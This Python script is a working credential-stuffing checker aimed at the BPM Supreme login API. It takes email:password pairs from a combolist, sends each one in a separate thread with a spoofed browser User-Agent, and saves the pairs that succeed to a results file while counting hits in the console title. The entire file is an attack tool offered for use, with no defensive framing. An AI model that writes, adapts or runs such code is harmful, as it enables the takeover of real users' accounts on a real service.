import requests
import threading
import time
from colorama import init, Fore, Style
import ctypes

init(autoreset=True)

url = "https://api.bpmsupreme.com/v4/login"
headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
}

print_lock = threading.Lock()

valid_count = 0
invalid_count = 0

def login(email, password):
    global valid_count, invalid_count
    
    payload = {
        "email": email,
        "password": password,
        "device": {
            "app_type": "web_landing",
            "app_version": "2.0",
            "build_version": "1",
            "device_uuid": "bf0cf9771d794e0371899953d528e20c",
            "device_data_os": "web",
            "device_data_device_name": "Windows Chrome",
            "debug": False,
            "language": "en-US"
        },
        "from": "global-login"
    }
    
    response = requests.post(url, json=payload, headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        result = f"{email}:{password}"
        with open("result.txt", "a") as result_file:
            result_file.write(result + "\n")
        with print_lock:
            valid_count += 1
            ctypes.windll.kernel32.SetConsoleTitleW(get_title())
            print(Fore.GREEN + f"[+] Login successful for {result}")
    else:
        try:
            error_data = response.json()["error"]
            if error_data.get("type") == "ResourceNotFound" and error_data.get("message") == "Email not found":
                with print_lock:
                    invalid_count += 1
                    ctypes.windll.kernel32.SetConsoleTitleW(get_title())
                    print(Fore.RED + f"[+] Login failed for {email}:{password}: Email not found")
            elif error_data.get("type") == "InvalidLoginError" and error_data.get("message") == "Your password was invalid":
                with print_lock:
                    invalid_count += 1
                    ctypes.windll.kernel32.SetConsoleTitleW(get_title())
                    print(Fore.RED + f"[+] Login failed for {email}:{password}: Invalid password")
            else:
                with print_lock:
                    invalid_count += 1
                    ctypes.windll.kernel32.SetConsoleTitleW(get_title())
                    print(Fore.RED + f"[+] Login failed for {email}:{password} with status code: {response.status_code}")
                    print(response.text)
        except Exception as e:
            with print_lock:
                invalid_count += 1
                ctypes.windll.kernel32.SetConsoleTitleW(get_title())
                print(Fore.RED + f"[+] An error occurred for {email}:{password}: {e}")
    
def threaded_login(email, password):
    thread = threading.Thread(target=login, args=(email, password))
    thread.start()
    time.sleep(0.5)

def get_title():
    return f"BPM | Valid: {valid_count} | Invalid: {invalid_count}"

with open("combolist.txt", "r") as file:
    for line in file:
        email, password = line.strip().split(":")
        threaded_login(email, password)
